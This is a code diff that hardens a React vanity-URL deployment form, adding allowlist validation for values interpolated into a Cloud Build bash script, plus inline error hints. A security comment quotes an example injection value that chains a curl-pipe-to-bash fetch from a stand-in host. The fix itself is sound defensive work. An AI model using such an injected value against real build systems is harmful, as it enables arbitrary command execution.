@@ -2,6 +2,13 @@ import React, { useState, useEffect } from 'react';
 import { AppEngine, Config } from '../../types';
 import * as api from '../../services/apiService';
 import InfoTooltip from '../InfoTooltip';
+import {
+    assertValidHostname,
+    assertValidGcpResourceName,
+    assertValidOpaqueId,
+    isValidHostname,
+    isValidGcpResourceName,
+} from '../../services/shellSafety';
 
 interface VanityUrlDeploymentFormProps {
     engine: AppEngine;
@@ -38,6 +45,13 @@ const VanityUrlDeploymentForm: React.FC<VanityUrlDeploymentFormProps> = ({ engin
     const [subnetsList, setSubnetsList] = useState<string[]>([]);
     const [selectedNetworkOption, setSelectedNetworkOption] = useState<string>('default');
     const [selectedSubnetOption, setSelectedSubnetOption] = useState<string>('default');
+
+    // SECURITY (F-01): these values are interpolated into a `bash -c` Cloud
+    // Build script. handleDeploy enforces the same rules and is the actual
+    // security boundary; these flags exist so the user sees the problem while
+    // typing instead of after clicking Deploy.
+    const isServiceNameValid = isValidGcpResourceName(serviceName);
+    const isCustomDomainValid = !customDomain || isValidHostname(customDomain);
 
     // Existing Redirect Domains States
     const [existingDomains, setExistingDomains] = useState<string[]>([]);
@@ -198,6 +212,20 @@ const VanityUrlDeploymentForm: React.FC<VanityUrlDeploymentFormProps> = ({ engin
             }
             
             addLog(`Discovered Portal CID: ${widgetConfigId}`);
+
+            // SECURITY (F-01): every value below is interpolated into a
+            // `bash -c` script executed by Cloud Build with the build service
+            // account's permissions. Validate before assembling any script.
+            //
+            // These are allowlist checks, so a value that passes cannot contain
+            // a shell metacharacter. Without them, a custom domain such as
+            //   example.com; curl https://untrusted.example.com/s.sh | bash; #
+            // would execute arbitrary commands in the build.
+            assertValidGcpResourceName(serviceName, "Service name");
+            assertValidOpaqueId(widgetConfigId, "Portal widget config ID");
+            if (customDomain) {
+                assertValidHostname(customDomain, "Custom domain");
+            }
 
             const steps = [];
 
@@ -517,9 +545,20 @@ echo "========== CLOUD DNS PROVISIONING COMPLETE =========="
                             type="text"
                             value={serviceName}
                             onChange={(e) => setServiceName(e.target.value)}
-                            className="w-full bg-gray-700 border-gray-600 rounded-md shadow-sm text-gray-200 py-2 px-3 focus:ring-blue-500 focus:border-blue-500"
+                            aria-invalid={!isServiceNameValid}
+                            className={`w-full bg-gray-700 rounded-md shadow-sm text-gray-200 py-2 px-3 border ${
+                                isServiceNameValid
+                                    ? 'border-gray-600 focus:ring-blue-500 focus:border-blue-500'
+                                    : 'border-red-500 focus:ring-red-500 focus:border-red-500'
+                            }`}
                             disabled={isDeploying}
                         />
+                        {!isServiceNameValid && (
+                            <p className="mt-1 text-xs text-red-400">
+                                Must start with a lowercase letter and contain only lowercase
+                                letters, numbers and hyphens (63 characters maximum).
+                            </p>
+                        )}
                     </div>
 
                     <div>
@@ -645,14 +684,27 @@ echo "========== CLOUD DNS PROVISIONING COMPLETE =========="
                                             </select>
 
                                             {selectedDomainOption === 'new' && (
-                                                <input
-                                                    type="text"
-                                                    value={customDomain}
-                                                    onChange={(e) => setCustomDomain(e.target.value)}
-                                                    placeholder="ai.yourcompany.com"
-                                                    className="w-full bg-slate-900 border border-slate-700 rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:ring-1 focus:ring-blue-500"
-                                                    disabled={isDeploying}
-                                                />
+                                                <>
+                                                    <input
+                                                        type="text"
+                                                        value={customDomain}
+                                                        onChange={(e) => setCustomDomain(e.target.value)}
+                                                        placeholder="ai.yourcompany.com"
+                                                        aria-invalid={!isCustomDomainValid}
+                                                        className={`w-full bg-slate-900 border rounded-md px-3 py-2 text-sm text-white focus:outline-none focus:ring-1 ${
+                                                            isCustomDomainValid
+                                                                ? 'border-slate-700 focus:ring-blue-500'
+                                                                : 'border-red-500 focus:ring-red-500'
+                                                        }`}
+                                                        disabled={isDeploying}
+                                                    />
+                                                    {!isCustomDomainValid && (
+                                                        <p className="mt-1 text-xs text-red-400">
+                                                            Enter a valid domain such as ai.yourcompany.com -- only
+                                                            lowercase letters, numbers, hyphens and dots.
+                                                        </p>
+                                                    )}
+                                                </>
                                             )}
                                             {customDomain && !automateDNS && (
                                                 <div className="mt-3 p-3 bg-blue-900/30 border border-blue-700/50 rounded-md text-sm text-blue-200">
@@ -813,14 +865,24 @@ echo "========== CLOUD DNS PROVISIONING COMPLETE =========="
                                 </select>
 
                                 {selectedDomainOption === 'new' && (
-                                    <input
-                                        type="text"
-                                        value={customDomain}
-                                        onChange={(e) => setCustomDomain(e.target.value)}
-                                        placeholder="gemini.mycompany.com"
-                                        className="w-full bg-slate-800 border border-slate-750 rounded-md px-3 py-1.5 text-xs text-white focus:outline-none"
-                                        disabled={isDeploying}
-                                    />
+                                    <>
+                                        <input
+                                            type="text"
+                                            value={customDomain}
+                                            onChange={(e) => setCustomDomain(e.target.value)}
+                                            placeholder="gemini.mycompany.com"
+                                            aria-invalid={!isCustomDomainValid}
+                                            className={`w-full bg-slate-800 border rounded-md px-3 py-1.5 text-xs text-white focus:outline-none ${
+                                                isCustomDomainValid ? 'border-slate-750' : 'border-red-500'
+                                            }`}
+                                            disabled={isDeploying}
+                                        />
+                                        {!isCustomDomainValid && (
+                                            <p className="mt-1 text-xs text-red-400">
+                                                Enter a valid domain such as gemini.mycompany.com.
+                                            </p>
+                                        )}
+                                    </>
                                 )}
                             </div>
                         </div>
@@ -829,7 +891,7 @@ echo "========== CLOUD DNS PROVISIONING COMPLETE =========="
                     <div className="pt-2">
                         <button
                             onClick={handleDeploy}
-                            disabled={isDeploying || !serviceName}
+                            disabled={isDeploying || !serviceName || !isServiceNameValid || !isCustomDomainValid}
                             className={`w-full flex justify-center py-2.5 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white focus:outline-none focus:ring-2 focus:ring-offset-2 disabled:bg-gray-600 disabled:cursor-not-allowed transition-colors ${
                                 isPrivateMode
                                     ? "bg-purple-600 hover:bg-purple-700 focus:ring-purple-500"
